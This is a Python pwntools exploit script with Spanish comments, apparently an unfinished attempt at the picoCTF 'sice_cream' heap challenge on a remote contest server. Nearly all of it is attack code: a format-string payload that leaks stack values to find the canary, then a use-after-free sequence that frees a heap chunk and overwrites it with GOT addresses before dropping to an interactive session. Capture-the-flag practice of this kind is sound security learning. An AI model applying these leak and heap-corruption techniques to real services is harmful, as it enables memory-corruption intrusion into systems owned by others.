#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Binarios
elf = ELF('./sice_cream')
libc = ELF('./libc.so.6')

# Conectar
p = remote('jupiter.challenges.picoctf.org', 9521)

# Gadgets
pop_rdi = 0x400d83  # pop rdi; ret

# Funciones
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x400b76

log.info("Iniciando exploit...")

# El programa tiene canary, pero podemos hacer leak primero
# Intentar format string para leak de canary
p.recvuntil(b'name?')

# Format string para leak de canary y direcciones
payload = b'%p.' * 50
p.sendline(payload)

# Recibir respuesta
p.recvuntil(b'>')
response = p.recvline()
log.info(f"Format string leaks: {response}")

# Analizar leaks
leaks = response.split(b'.')
if len(leaks) > 10:
    # Buscar canary (termina en 00)
    for i, leak in enumerate(leaks):
        if b'0x' in leak:
            val = leak.strip()
            if val.endswith(b'00'):
                log.info(f"Posible canary en posición {i}: {val}")

# Si el buffer overflow no funciona por el canary,
# intentemos el UAF que descubrimos antes
log.info("Intentando UAF...")

# Comprar helado
p.sendline(b'1')
p.recvuntil(b'How much?')
p.sendline(b'256')  # Tamaño grande
p.recvuntil(b'Describe')
p.sendline(b'AAAA')

# Free
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b'Which')
p.sendline(b'0')

# Use after free - reintroduce
p.recvuntil(b'>')
p.sendline(b'3')
p.recvuntil(b'name?')

# Intentar sobrescribir con dirección de system o flag
# El heap chunk liberado puede tener metadata que podemos controlar
payload = p64(puts_got) * 10
p.send(payload)

# Ver qué pasa
p.recvuntil(b'>')
p.sendline(b'1')  # Comprar otro
p.recvuntil(b'How much?')
p.sendline(b'256')

# Interactivo para debug
p.interactive()